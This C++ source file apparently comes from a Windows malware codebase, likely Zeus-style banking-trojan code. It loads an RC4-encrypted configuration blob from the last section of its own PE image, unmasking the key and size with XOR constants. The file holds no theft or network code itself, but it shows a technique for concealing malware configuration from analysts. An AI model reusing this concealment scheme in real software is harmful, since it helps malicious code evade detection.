#include <windows.h>
#include <wincrypt.h>

#include "defines.h"
#include "DllCore.h"
#include "dllconfig.h"
#include "cryptedstrings.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\peimage.h"
#include "..\common\crypt.h"

void DllConfig::init(void)
{

}

void DllConfig::uninit(void)
{

}

void DllConfig::getRc4Key(Crypt::RC4KEY *rc4Key)
{
	// get last section
	const WORD sectionIndex = PeImage::_getNumberOfSections(coreDllData.modules.currentModule) - 1;
	LPBYTE section = (LPBYTE)PeImage::_getSectionOfModule(coreDllData.modules.currentModule, sectionIndex, NULL);
	if (!section)
		return;

	Mem::_copy(rc4Key->state, section, sizeof(rc4Key->state));
	for (DWORD i = 0; i < sizeof(rc4Key->state); i += sizeof(DWORD))
		*(DWORD *)&rc4Key->state[i] ^= RAND_DWORD1;
	rc4Key->x = 0;
	rc4Key->y = 0;
}


BinStorage::STORAGE *DllConfig::getCurrent(void)
{
	void *data;
	DWORD dataSize;
	Crypt::RC4KEY rc4Key;

	//Получаем конфиг.
	{
		// get last section
		const WORD sectionIndex = PeImage::_getNumberOfSections(coreDllData.modules.currentModule) - 1;
		LPBYTE section = (LPBYTE)PeImage::_getSectionOfModule(coreDllData.modules.currentModule, sectionIndex, NULL);
		if (!section)
			return NULL;

		Mem::_copy(&dataSize, section + sizeof(rc4Key.state), sizeof(dataSize));
		dataSize ^= RAND_DWORD2;
		data = (void *)Mem::alloc(dataSize);
		if(!data)
			return NULL;

		Mem::_copy(data, section + sizeof(rc4Key.state) + sizeof(dataSize), dataSize);

		getRc4Key(&rc4Key);

		if(BinStorage::_unpack(NULL, data, dataSize, &rc4Key) == 0)
		{
			Mem::free(data);
			return NULL;
		}
	}
	return (BinStorage::STORAGE *)data;
}